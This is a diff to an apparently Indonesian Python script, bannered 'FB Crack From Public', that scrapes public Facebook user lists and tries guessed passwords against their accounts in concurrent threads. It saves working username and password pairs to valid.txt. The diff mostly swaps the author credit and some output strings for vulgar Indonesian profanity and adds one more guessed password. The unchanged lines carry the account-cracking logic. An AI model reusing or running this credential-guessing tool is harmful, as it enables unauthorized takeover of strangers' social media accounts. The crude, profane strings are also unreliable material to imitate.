@@ -1,7 +1,4 @@
-#Creator:Fahmiapz
-#Date:19/09/2020
-#time:23:00
-#Recode Teros Boss Tinggal Pake Apa Susahnya Anjeng
+#creator ;Faizul
 import requests,re,os,sys,time,json,random,urllib,mechanize
 from requests.exceptions import ConnectionError
 from time import sleep as timeout
@@ -10,7 +7,7 @@ from concurrent.futures import ThreadPoolExecutor
 def clear():
     os.system('clear')
 def baner():
-    print('\t\033[91m~\033[94mFB\033[00m Crack From Public\033[91m~\033[00m\n')
+    print('\t\033[91m~\033[94mFB\033[00m Ngentot From Public\033[91m~\033[00m\n')
     print('\t\033[93m<\033[90m--------------------\033[93m>\033[00m')
 die=0
 chek=0
@@ -53,7 +50,7 @@ def login(user,pw,cek=False):
                   with open('valid.txt') as f:
                        f.write(user + '|' + pw + '\n')
           elif 'www.facebook.com' in q['error_msg']:
-             print('\r\033[00m[\033[93mCheck\033[00m]'+user+'\033[96m|\033[00m'+pw                        ,end="")
+             print('\r\033[00m[\033[93mCSedang ngentot\033[00m]'+user+'\033[96m|\033[00m'+pw                        ,end="")
              chek+=1
              if cek:
                   check.append(user+'|'+pw)
@@ -67,7 +64,7 @@ def login(user,pw,cek=False):
                             time.sleep(0.2)
 
 def search():
-    knf=input('\t\033[00m[\033[96m?\033[00m]Query: \033[96m')
+    knf=input('\t\033[00m[\033[96m?\033[00m]Password asal: \033[96m')
     src=br.open('https://mbasic.facebook.com/public/'+knf).read()
     users=re.findall(r'<td class="ca cb"><a href="(.*?)"><div class="cc"><div class="cd">(.*?)</div>', str(src))
     for user in users:
@@ -103,6 +100,7 @@ def search():
                  litpas.append('Anjing')
                  litpas.append('786786')
                  litpas.append('Bangladesh')
+                 litpas.append('memek123')
                  for passw in set(litpas):
                      ex.submit(login,(users[1]),(passw))
 
